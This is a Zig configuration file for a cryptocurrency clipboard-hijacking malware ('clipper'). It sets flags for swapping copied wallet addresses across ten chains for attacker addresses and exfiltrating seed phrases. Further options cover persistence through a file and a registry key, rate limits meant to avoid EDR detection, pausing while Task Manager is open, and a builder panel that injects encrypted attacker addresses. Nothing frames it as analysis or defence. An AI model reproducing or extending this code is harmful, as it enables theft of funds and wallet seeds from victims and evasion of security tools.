const std = @import("std");

pub const CLIPPER_ENABLED: bool = true;
pub const CLIPPER_SEED_EXFIL: bool = true;
pub const CLIPPER_SWAP_LOG: bool = true;

// === Single-Use ===
// After first successful swap, persist a marker and never swap again.
// Uses both file (%APPDATA%\CLIPLZ\used.txt) and registry (HKCU\Software\ClipLZ\Used).
pub const CLIPPER_SINGLE_USE: bool = false;

// === Context Preservation ===
// When true, only the address substring is replaced, surrounding text is preserved.
// When false, the entire clipboard is replaced with the attacker address.
pub const CLIPPER_PRESERVE_CONTEXT: bool = true;

// === Multi-Address Rotation ===
// When true, each chain can have multiple replacement addresses.
// Round-robins through them on each swap for that chain.
pub const CLIPPER_ROTATE_ADDRS: bool = false;

// === Whitelist ===
// When true, addresses in the whitelist are never replaced.
pub const CLIPPER_WHITELIST_ENABLED: bool = true;

// === Rate Limiting ===
// Max number of address swaps per minute.
// Prevents rapid replacement patterns that EDR might flag.
pub const CLIPPER_RATE_LIMIT_ENABLED: bool = true;
pub const CLIPPER_MAX_SWAPS_PER_MIN: u32 = 6;

// === Clipboard History ===
// Keep last N raw clipboard entries for potential debugging.
pub const CLIPPER_HISTORY_ENABLED: bool = false;
pub const CLIPPER_HISTORY_DEPTH: usize = 32;

// === Test Mode ===
// When true, provides hardcoded fallback addresses for development/testing.
// These are NEVER used in production — the Panel builder injects real addresses
// via the AES-GCM encrypted config blob (CLIPLZCFG).
// MUST be false for production builds.
pub const CLIPPER_TEST_MODE: bool = true;

// === Chain Selection ===
pub const BTC_ENABLED: bool = true;
pub const ETH_ENABLED: bool = true;
pub const TRX_ENABLED: bool = true;
pub const SOL_ENABLED: bool = true;
pub const LTC_ENABLED: bool = true;
pub const XMR_ENABLED: bool = true;
pub const DOGE_ENABLED: bool = true;
pub const BCH_ENABLED: bool = true;
pub const XRP_ENABLED: bool = true;
pub const ADA_ENABLED: bool = true;

// === Detection Thresholds ===
pub const MIN_ADDR_LEN: usize = 26;
pub const MAX_SEED_LEN: usize = 512;
pub const PAUSE_ON_TASKMGR: bool = true;
pub const TASKMGR_CHECK_INTERVAL_MS: u64 = 2000;
